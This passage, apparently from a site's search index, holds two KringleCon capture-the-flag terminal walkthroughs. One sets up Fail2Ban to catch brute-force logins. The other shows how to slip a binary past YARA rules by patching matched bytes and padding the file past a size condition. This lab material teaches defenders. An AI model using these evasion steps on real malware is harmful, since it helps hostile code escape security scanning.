Kerberoasting and Active Directory permissions! Why don't you do some work with Fail2Ban on this Cranberry Pi terminal first, then we\u2019ll talk Kerberoasting and Active Directory. OK? This terminal is located in Santa's Office at KringoleCon. Solving this terminal challenge provides additional hints for objective 8. To view the hints for this terminal challenge use the menu on the left. To solve this terminal challenge you need to configure Fail2Ban to automatically create a 'naughty lists' of IPs based on brute forcing and password spraying attempts. You will need to create three files for Fail2Ban to solve this challenge, a jail file, an action file, and a filter file. You will need to create these files based on the description provided in this challenge. You will need to create a jail file, /etc/fail2ban/jail.d/santa_jail.conf , to specify the log file fail2ban needs to monitor and the parameters that qualify an IP address for the naughty list. /etc/fail2ban/jail.d/santa_jail.conf [ santa_jail ] enabled = true logpath = / var / log / hohono . log findtime = 1 h maxretry = 10 bantime = 30 m filter = naughtynice_filter action = naughtynice_action You will need to create an action file, /etc/fail2ban/action.d/naughtynice_action.conf , to specify what fail2ban should do when a naughty IP address is found. /etc/fail2ban/action.d/naughtynice_action.conf [ Definition ] actionban = / root / naughtylist add < ip > actionunban = / root / naughtylist del < ip > You will need to create a filter file, /etc/fail2ban/filter.d/naughtynice_filter.conf , to specify how fail2ban should find the naughty IP addresses. /etc/fail2ban/action.d/naughtynice_action.conf [ Definition ] failregex = ^ Failed login from < HOST > for \\ w + $ ^ Login from < HOST > rejected due to unknown user name $ ^ < HOST > sent a malformed request $ Testing Tip You can use fail2ban-regex to test out the regex you want to filter. ex. fail2ban-regex '2021-12-18 20:00:39 Failed login from 43.243.8.109 for dasher' '^ Failed login from <HOST> for \\w+$' Remove Valid Enteries From Log You can use egrep to filter out the valid log enteries. This will leave the entries that you need to triger on. ex. egrep -v '(Login from\\s+[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\s+successful$)|(Valid heartbeat from\\s+[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$)|([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\: Request completed successfully$)|(Failed login from [0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3} for \\w+$)|(Login from [0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3} rejected due to unknown user name$)' /var/log/hohono.log To run fail2ban after creating/modifying the configuration files run the following commands: fail2ban - client unban -- all service fail2ban restart ./ naughtylist refresh Once you've created the 3 files mentioned above and ran fail2ban as stated above, you will receive the following message:","title":"HoHo \u2026 No"},{"location":"posts/Terminals/Terminal9/","text":"Terminal Walk-through Details Location : KringleCon/Entry Elf : Fitzy Shortstack Elf's Objective Message Hiya, I'm Fitzy Shortstack! I was just trying to learn a bit more about YARA with this here Cranberry Pi terminal. I mean, I'm not saying I'm worried about attack threats from that other con next door, but... OK. I AM worried. I've been thinking a bit about how malware might bypass YARA rules. If you can help me solve the issue in this terminal, I\u2019ll understand YARA so much better! Would you please check it out so I can learn? And, I\u2019ll tell you what \u2013 if you help me with YARA, I\u2019ll give you some tips for Splunk! I think if you make small, innocuous changes to the executable, you can get it to run in spite of the YARA rules. This terminal is located in Entry at KringoleCon. Solving this terminal challenge provides additional hints for objective 9. To view the hints for this terminal challenge use the menu on the left. To solve this terminal challenge you will need to modify ./the_critical_elf_app enough to bypass yara. Run the application you will see the following error message: ~ $ ./ the_critical_elf_app yara_rule_135 ./ the_critical_elf_app The above message indicates yara rule 135 is being trigered. The yara rules are located in folder ./yara_rules/rules.yar . Use the command egrep 'yara_rule_135 ' yara_rules/rules.yar -A 12 to view rule 135. Editting Binary file To edit a binary file: Open the binary file normally with vim vim Convert them to xxd human-readable format :%!xxd Edit the hex part in the left Convert xxd-human readable format back to binary :%!xxd -r Save modified content :w Rule 135 is being triggered on the candycane string in ./the_critical_elf_app . Run vim ./the_critical_elf_app Type :%!xxd Change the byte at 0x200E from 61 to 62. It will look something like this: Save the new file by entering :w in vim. Re-run ./the_critical_elf_app . Answer to bypass rule 135 Change the byte at 0x200E from 61 to 62 The above modifcation will bypass Yara rule 135, however a new rule is now being triggered. From the above results, you can see Rule 1056 is being triggered. Use this command to read the corresponding yara rule, egrep 'yara_rule_1056 ' yara_rules/rules.yar -A 12 . This rule is looking for two series of hex values in the file. You can use xxd and grep to find where these matches are in the_critical_elf_app . Running xxd the_critical_elf_app | grep '6c 6962 632e' -A 2 will show: This is being triggered on part of the file that can't be changed as it's a library name. Running xxd the_critical_elf_app | grep '726f 6772 616d 2121' -A 2 will show: You can change the string \"is program!!\". Using the same above instructions, change the byte at 0x2054 from 72 to 73 to bypass this rule. Answer to bypass rule 1056 Change the byte at 0x2054 from 72 to 73 Re-run the the_critical_elf_app program. The results are shown below: Yara Rule 1732 is now being triggered. Use egrep 'yara_rule_1732 ' yara_rules/rules.yar -A 32 to read this rule. rule yara_rule_1732 { meta : description = \"binaries - alwayz_winter.exe\" author = \"Santa\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-22\" hash = \"c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8\" strings : $ s1 = \"This is critical for the execution of this program!!\" fullword ascii $ s2 = \"__frame_dummy_init_array_entry\" fullword ascii $ s3 = \".note.gnu.property\" fullword ascii $ s4 = \".eh_frame_hdr\" fullword ascii $ s5 = \"__FRAME_END__\" fullword ascii $ s6 = \"__GNU_EH_FRAME_HDR\" fullword ascii $ s7 = \"frame_dummy\" fullword ascii $ s8 = \".note.gnu.build-id\" fullword ascii $ s9 = \"completed.8060\" fullword ascii $ s10 = \"_IO_stdin_used\" fullword ascii $ s11 = \".note.ABI-tag\" fullword ascii $ s12 = \"naughty string\" fullword ascii $ s13 = \"dastardly string\" fullword ascii $ s14 = \"__do_global_dtors_aux_fini_array_entry\" fullword ascii $ s15 = \"__libc_start_main@@GLIBC_2.2.5\" fullword ascii $ s16 = \"GLIBC_2.2.5\" fullword ascii $ s17 = \"its_a_holly_jolly_variable\" fullword ascii $ s18 = \"__cxa_finalize\" fullword ascii $ s19 = \"HolidayHackChallenge {NotReallyAFlag} \" fullword ascii $ s20 = \"__libc_csu_init\" fullword ascii condition : uint32 ( 1 ) == 0x02464c45 and filesize < 50 KB and 10 of them } This rule is matching on the header of the file, if the filesize is less than 50KB. Use these commands to append the file to become greater than 50KB. Answer to bypass rule 1732 ~$ cat ./the_critical_elf_app >> ./the_critical_elf_app1 ~$ cat ./the_critical_elf_app1 >> ./the_critical_elf_app ~$ cat ./the_critical_elf_app1 >> ./the_critical_elf_app ~$ cat ./the_critical_elf_app1 >> ./the_critical_elf_app This will make the file 66.8KB as shown below: Run the newly created file to see the final results:","title":"Yara Analysis"}]}